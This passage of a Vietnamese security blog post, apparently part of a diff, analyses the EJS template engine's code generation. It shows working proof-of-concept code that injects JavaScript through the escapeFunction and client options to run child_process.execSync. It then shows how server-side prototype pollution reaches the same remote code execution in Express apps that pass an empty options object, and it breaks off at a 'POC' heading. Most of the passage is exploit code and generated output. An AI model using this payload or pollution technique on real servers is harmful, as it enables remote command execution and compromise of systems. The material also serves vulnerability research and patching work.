+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;destructuredLocals[&#39;</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="s1">&#39;] is not a valid JS identifier.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">destructuring</span> <span class="o">+=</span> <span class="s1">&#39;,\n  &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">destructuring</span> <span class="o">+=</span> <span class="nx">name</span> <span class="o">+</span> <span class="s1">&#39; = __locals.&#39;</span> <span class="o">+</span> <span class="nx">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">prepended</span> <span class="o">+=</span> <span class="nx">destructuring</span> <span class="o">+</span> <span class="s1">&#39;;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">_with</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39;  with (&#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span> <span class="o">+</span> <span class="s1">&#39; || {}) {&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">appended</span> <span class="o">+=</span> <span class="s1">&#39;  }&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">appended</span> <span class="o">+=</span> <span class="s1">&#39;  return __output;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">source</span> <span class="o">=</span> <span class="nx">prepended</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">source</span> <span class="o">+</span> <span class="nx">appended</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">compileDebug</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;var __line = 1&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s1">&#39;  , __lines = &#39;</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">templateText</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s1">&#39;  , __filename = &#39;</span> <span class="o">+</span> <span class="nx">sanitizedFilename</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s1">&#39;try {&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">source</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s1">&#39;} catch (e) {&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s1">&#39;  rethrow(e, __lines, __filename, __line, escapeFn);&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s1">&#39;}&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">src</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">client</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;escapeFn = escapeFn || &#39;</span> <span class="o">+</span> <span class="nx">escapeFn</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">compileDebug</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;rethrow = rethrow || &#39;</span> <span class="o">+</span> <span class="nx">rethrow</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">strict</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;&#34;use strict&#34;;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">debug</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">compileDebug</span> <span class="o">&amp;&amp;</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">src</span> <span class="o">=</span> <span class="nx">src</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s1">&#39;//# sourceURL=&#39;</span> <span class="o">+</span> <span class="nx">sanitizedFilename</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>Đến đây ta đã biết rằng hàm sau sẽ được execute và hàm được tạo bởi các string ghép lại ? Vậy sẽ thế nào nếu ta có thẻ input tùy ý vào hàm này qua options của ejs? Từ đó lấy RCE ? Ta sẽ đi tìm một vài điểm nào đó có thể cho ta input vào . Nhìn sơ ta có thể thấy</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_JS_IDENTIFIER</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;outputFunctionName is not a valid JS identifier.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39;  var &#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span> <span class="o">+</span> <span class="s1">&#39; = __append;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span></code></pre></div><p>Nhưng vì có regrex khá căng nên cũng không khả thi lắm. Riêng chỉ có đoạn này :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">client</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;escapeFn = escapeFn || &#39;</span> <span class="o">+</span> <span class="nx">escapeFn</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">compileDebug</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;rethrow = rethrow || &#39;</span> <span class="o">+</span> <span class="nx">rethrow</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>Well cả 2 biến client và escapeFn đều được lấy từ options object vào ? Sẽ ra sao nếu ta split javascript code với &ldquo;;&rdquo; và chèn rce code vào ?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ejs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;ejs&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">escapeFunction</span> <span class="o">=</span> <span class="s2">&#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(&#39;child_process&#39;);console.log(cp.execSync(&#39;id&#39;).toString());&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;12113awefeaw&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">compiled</span> <span class="o">=</span> <span class="nx">ejs</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="p">{</span> <span class="nx">client</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">escapeFunction</span><span class="o">:</span> <span class="nx">escapeFunction</span> <span class="p">});</span> <span class="c1">// not works 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">compiled</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
+</span></span></code></pre></div><p>Khi này function sau sẽ được generate ra :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">anonymous</span><span class="p">(</span><span class="nx">locals</span><span class="p">,</span> <span class="nx">escapeFn</span><span class="p">,</span> <span class="nx">include</span><span class="p">,</span> <span class="nx">rethrow</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nx">rethrow</span> <span class="o">=</span> <span class="nx">rethrow</span> <span class="o">||</span> <span class="kd">function</span> <span class="nx">rethrow</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">str</span><span class="p">,</span> <span class="nx">flnm</span><span class="p">,</span> <span class="nx">lineno</span><span class="p">,</span> <span class="nx">esc</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">lines</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">start</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">lineno</span> <span class="o">-</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">end</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="nx">lines</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span> <span class="nx">lineno</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="nx">esc</span><span class="p">(</span><span class="nx">flnm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Error context
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">var</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">lines</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">start</span><span class="p">,</span> <span class="nx">end</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">line</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">curr</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">+</span> <span class="nx">start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nx">curr</span> <span class="o">==</span> <span class="nx">lineno</span> <span class="o">?</span> <span class="s1">&#39; &gt;&gt; &#39;</span> <span class="o">:</span> <span class="s1">&#39;    &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="o">+</span> <span class="nx">curr</span>
+</span></span><span class="line"><span class="cl">      <span class="o">+</span> <span class="s1">&#39;| &#39;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">+</span> <span class="nx">line</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Alter exception message
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">err</span><span class="p">.</span><span class="nx">path</span> <span class="o">=</span> <span class="nx">filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">err</span><span class="p">.</span><span class="nx">message</span> <span class="o">=</span> <span class="p">(</span><span class="nx">filename</span> <span class="o">||</span> <span class="s1">&#39;ejs&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="nx">lineno</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="nx">context</span> <span class="o">+</span> <span class="s1">&#39;\n\n&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/*OUR OPTIONS GOES IN HERE */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">escapeFn</span> <span class="o">=</span> <span class="nx">escapeFn</span> <span class="o">||</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">1337</span><span class="p">);</span><span class="kd">let</span> <span class="nx">cp</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">);</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">cp</span><span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">());;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">__line</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">__lines</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">__filename</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">__output</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">__append</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">s</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="nx">s</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="nx">__output</span> <span class="o">+=</span> <span class="nx">s</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">with</span> <span class="p">(</span><span class="nx">locals</span> <span class="o">||</span> <span class="p">{})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">;</span> <span class="nx">__append</span><span class="p">(</span><span class="s2">&#34;&lt;h1&gt;Hello &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">;</span> <span class="nx">__append</span><span class="p">(</span><span class="nx">escapeFn</span><span class="p">(</span> <span class="nx">name</span> <span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">;</span> <span class="nx">__append</span><span class="p">(</span><span class="s2">&#34;&lt;/h1&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">__output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">rethrow</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">__lines</span><span class="p">,</span> <span class="nx">__filename</span><span class="p">,</span> <span class="nx">__line</span><span class="p">,</span> <span class="nx">escapeFn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Và ta đã có thể chạy bất kì js command nào !!!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">escapeFn</span> <span class="o">=</span> <span class="nx">escapeFn</span> <span class="o">||</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">1337</span><span class="p">);</span><span class="kd">let</span> <span class="nx">cp</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">);</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">cp</span><span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">());;</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HyQcobyOxg.png" alt="image" />
+    
+  </figure>
+</p>
+
+
+<h2 class="relative group">Prototype pollution to RCE . 
+    <div id="prototype-pollution-to-rce-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#prototype-pollution-to-rce-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>Nhưng trong thực tế ta sẽ không kiểm soát được options được chèn vào . Vậy sẽ ra sao nếu ta có một prototype pollution ở phía server ? Test với đoạn code sau  :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ejs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;ejs&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ejs</span><span class="p">.</span><span class="nx">clearCache</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">escapeFunction</span> <span class="o">=</span> <span class="s2">&#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(&#39;child_process&#39;);console.log(cp.execSync(&#39;id&#39;).toString());&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">client</span> <span class="o">=</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">escapeFunction</span> <span class="o">=</span> <span class="nx">escapeFunction</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;12113awefeaw&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">compiled</span> <span class="o">=</span> <span class="nx">ejs</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span> <span class="c1">// not works 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">compiled</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
+</span></span></code></pre></div><p>Hmmmm , ta thấy không có gì xảy ra cả vì nếu để ý từ đầu đoạn code đã có một phần check rất rõ  :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">      <span class="nx">exports</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">d</span> <span class="o">||</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">o</span> <span class="o">||</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span></code></pre></div><p>Điều này đã block việc protoytpe pollution nhưng có một vấn đề là nhiều project ở ngoài kia sẽ không bao giờ để trống options field và đơn giản sẽ truyền vào đó một <strong>empty object</strong> ~ ~!! chính điều này là root cause cho việc bypass này , để simluate ta đơn giản chỉ cần truyền {} vào là đc .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ejs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;ejs&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ejs</span><span class="p">.</span><span class="nx">clearCache</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">escapeFunction</span> <span class="o">=</span> <span class="s2">&#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(&#39;child_process&#39;);console.log(cp.execSync(&#39;id&#39;).toString());&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">client</span> <span class="o">=</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">escapeFunction</span> <span class="o">=</span> <span class="nx">escapeFunction</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;12113awefeaw&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">compiled</span> <span class="o">=</span> <span class="nx">ejs</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="p">{});</span> <span class="c1">// works now with polluted {}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">compiled</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
+</span></span></code></pre></div><ul>
+<li>Tèn ten , điều này hoạt động vì hàm render sẽ ưu tiên nhận object từ ngoài vào.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ByAHKC-Ole.png" alt="image" />
+    
+  </figure>
+</li>
+</ul>
+
+
+<h1 class="relative group">Express js 
+    <div id="express-js" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#express-js" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<ul>
+<li>Để kiểm chứng việc truyền object trống vào options ta có thể xem sơ qua source của express js ta sẽ thấy đoạn sau  :
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BkWcAZyueg.png" alt="image" />
+    
+  </figure>
+
+Vì luôn có options object nên Express default cũng có thể bị lỗi này .</li>
+</ul>
+
+
+<h3 class="relative group">POC : 
+    <div id="poc-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
